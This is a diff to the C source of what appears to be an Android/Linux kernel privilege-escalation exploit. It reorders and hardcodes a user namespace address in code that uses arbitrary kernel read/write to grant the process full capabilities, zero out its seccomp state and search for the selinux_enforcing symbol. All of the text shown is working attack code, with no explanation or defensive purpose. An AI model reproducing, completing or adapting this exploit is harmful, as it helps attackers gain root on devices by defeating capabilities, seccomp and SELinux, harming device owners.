@@ -626,7 +626,7 @@ int getCredOffset(unsigned long task_struct_ptr, char* execName) {
         p++;
     unsigned n = MIN(strlen(p)+1, 16);
     memcpy(taskname, p, n);
-    p[15] = 0; // TODO: see if 16 character names are null terminated or not
+    p[15] = 0; 
     
     unsigned char task_struct_data[PAGE+16];
     kernel_read(task_struct_ptr, task_struct_data, PAGE);
@@ -695,16 +695,6 @@ int main(int argc, char **argv)
     kernel_write_ulong(cred_ptr + OFFSET__cred__cap_bset, 0x3fffffffffUL);
     //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);
 
-#ifdef OFFSET__cred__user_ns    
-    unsigned long user_ns = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
-    if (user_ns < 0xffffffc000000000ul || user_ns >= 0xffffffd000000000ul)
-        user_ns = 0xffffffc001744b70ul;
-#else
-    unsigned long user_ns = 0xffffffc001744b70ul;
-#endif
-
-    message("MAIN: user_ns = %lx", user_ns);
-
     int seccompStatus = prctl(PR_GET_SECCOMP);
     message("MAIN: SECCOMP status %d", seccompStatus);
     if (seccompStatus)
@@ -716,6 +706,17 @@ int main(int argc, char **argv)
         kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp + 8, 0);
         message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
     }
+
+#ifdef OFFSET__cred__user_ns    
+    unsigned long user_ns = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
+    if (user_ns < 0xffffffc000000000ul || user_ns >= 0xffffffd000000000ul)
+        user_ns = 0xffffffc001744b70ul;
+#else
+    unsigned long user_ns = 0xffffffc001744b70ul;
+#endif
+    user_ns = 0xffffffc000000000ul;
+
+    message("MAIN: user_ns = %lx", user_ns);
 
     message("MAIN: searching for selinux_enforcing");
     unsigned long selinux_enforcing = findSymbol(user_ns, "selinux_enforcing");
